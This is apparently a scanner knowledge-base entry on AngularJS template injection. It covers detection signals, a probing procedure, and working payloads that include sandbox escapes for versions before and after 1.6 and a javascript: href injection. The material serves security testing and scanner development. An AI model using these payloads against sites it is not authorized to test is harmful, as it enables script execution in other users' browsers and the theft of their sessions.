---
tags: angularjs, angular, template-injection, expression, sandbox, tier3, framework
category: framework
---

# AngularJS Template Injection / XSS

## How AngularJS differs from standard XSS

Standard XSS: inject HTML tags or JS -> browser executes
AngularJS XSS: inject `{{ expression }}` -> AngularJS evaluates as code

```html
<!-- AngularJS evaluates {{ }} as JavaScript expressions -->
<h1>{{searchTerm}}</h1>

<!-- If searchTerm = "{{1+1}}" -> rendered as "2" (evaluated!) -->
<!-- If searchTerm = "{{alert(1)}}" -> alert fires -->
```

## Detection signals

- Page imports `angular.js` or `angular.min.js`
- HTML has `ng-app` or `data-ng-app` attribute
- Templates use `{{ }}` syntax
- URL parameter appears inside `{{ }}`

## Basic payload

```
{{1+1}}                   -> renders "2" (confirms evaluation)
{{constructor.toString()}} -> confirms Angular is active
```

## Sandbox escape payloads (AngularJS < 1.6)

```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
```

## Modern bypass (AngularJS 1.6+)

```
{{$new.constructor('alert(1)')()}}
{{constructor.getOwnPropertyNames({})[6].constructor('alert(1)')()}}
```

## AngularJS in href (ng-href)

```html
<a ng-href="{{userUrl}}">Link</a>

<!-- Payload: javascript:alert(1) -->
<!-- Result: <a href="javascript:alert(1)"> -> fires on click -->
```

## Scanner detection

1. Check for angular.js import in page
2. Check for `ng-app` attribute
3. Look for `{{ }}` template expressions in HTML
4. Check if URL/form parameters appear inside `{{ }}`
5. Test with `{{1+1}}` — if response shows `2` -> confirmed
6. Escalate with sandbox escape

